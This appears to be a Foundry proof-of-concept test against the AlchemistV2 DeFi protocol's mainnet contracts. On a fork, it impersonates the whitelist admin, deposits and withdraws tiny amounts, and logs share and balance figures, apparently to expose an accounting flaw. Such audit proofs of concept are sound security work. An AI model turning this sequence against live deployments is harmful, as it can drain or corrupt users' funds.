pragma solidity 0.8.13;

import "forge-std/Test.sol";

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";

import {AlchemistV2} from "../AlchemistV2.sol";

interface IAlchemistV2 {
    function deposit(address token, uint256 amount, address recipient) external;
    function depositUnderlying(address token, uint256 amount, address recipient, uint256 minout) external returns (uint256 sharesIssued);
    function mint(uint256 amount, address recipient) external;
    function liquidate(address token, uint256 shares, uint256 minimumAmountOut) external;
    function accounts(address owner) external view returns (int256 debt, address[] memory depositedTokens);
    function positions(address owner, address yieldToken) external view returns (uint256 shares, uint256 lastAccruedWeight);
    function convertSharesToUnderlyingTokens(address yieldToken, uint256 shares) external view returns (uint256);
    function setYieldTokenEnabled(address token, bool enabled) external;
    function setUnderlyingTokenEnabled(address token, bool enabled) external;
    function withdrawUnderlying(address yieldToken, uint256 shares, address recipient, uint256 minimumAmountOut) external returns (uint256 amountWithdrawn);
    function setMaximumExpectedValue(address token, uint256 value) external;
    function getYieldTokenParameters(address yieldToken) external view returns (YieldTokenParams memory params);
}

/// @notice Defines yield token parameters.
struct YieldTokenParams {
    // The number of decimals the token has. This value is cached once upon registering the token so it is important
    // that the decimals of the token are immutable or the system will begin to have computation errors.
    uint8 decimals;
    // The associated underlying token that can be redeemed for the yield-token.
    address underlyingToken;
    // The adapter used by the system to wrap, unwrap, and lookup the conversion rate of this token into its
    // underlying token.
    address adapter;
    // The maximum percentage loss that is acceptable before disabling certain actions.
    uint256 maximumLoss;
    // The maximum value of yield tokens that the system can hold, measured in units of the underlying token.
    uint256 maximumExpectedValue;
    // The percent of credit that will be unlocked per block. The representation of this value is a 18  decimal
    // fixed point integer.
    uint256 creditUnlockRate;
    // The current balance of yield tokens which are held by users.
    uint256 activeBalance;
    // The current balance of yield tokens which are earmarked to be harvested by the system at a later time.
    uint256 harvestableBalance;
    // The total number of shares that have been minted for this token.
    uint256 totalShares;
    // The expected value of the tokens measured in underlying tokens. This value controls how much of the token
    // can be harvested. When users deposit yield tokens, it increases the expected value by how much the tokens
    // are exchangeable for in the underlying token. When users withdraw yield tokens, it decreases the expected
    // value by how much the tokens are exchangeable for in the underlying token.
    uint256 expectedValue;
    // The current amount of credit which is will be distributed over time to depositors.
    uint256 pendingCredit;
    // The amount of the pending credit that has been distributed.
    uint256 distributedCredit;
    // The block number which the last credit distribution occurred.
    uint256 lastDistributionBlock;
    // The total accrued weight. This is used to calculate how much credit a user has been granted over time. The
    // representation of this value is a 18 decimal fixed point integer.
    uint256 accruedWeight;
    // A flag to indicate if the token is enabled.
    bool enabled;
}

interface IWhitelist {
    function add(address) external;
}

contract POC is Test {
    function test_execute() external {
        deal(address(0x6B175474E89094C44Da98b954EedeAC495271d0F), address(this), 10e18);
        vm.prank(0x9e2b6378ee8ad2A4A95Fe481d63CAba8FB0EBBF9);
        IWhitelist(0x78537a6CeBa16f412E123a90472C6E0e9A8F1132).add(address(this));

        IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F).approve(0x5C6374a2ac4EBC38DeA0Fc1F8716e5Ea1AdD94dd, 2);
        IAlchemistV2(0x5C6374a2ac4EBC38DeA0Fc1F8716e5Ea1AdD94dd).depositUnderlying(0x0538C8bAc84E95A9dF8aC10Aad17DbE81b9E36ee, 2, address(this), 0);

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 5000);

        IAlchemistV2(0x5C6374a2ac4EBC38DeA0Fc1F8716e5Ea1AdD94dd).withdrawUnderlying(0x0538C8bAc84E95A9dF8aC10Aad17DbE81b9E36ee, 1, address(this), 0);

        YieldTokenParams memory params = IAlchemistV2(0x5C6374a2ac4EBC38DeA0Fc1F8716e5Ea1AdD94dd).getYieldTokenParameters(0x0538C8bAc84E95A9dF8aC10Aad17DbE81b9E36ee);

        console.log(params.activeBalance);
        console.log(params.totalShares);
    }
}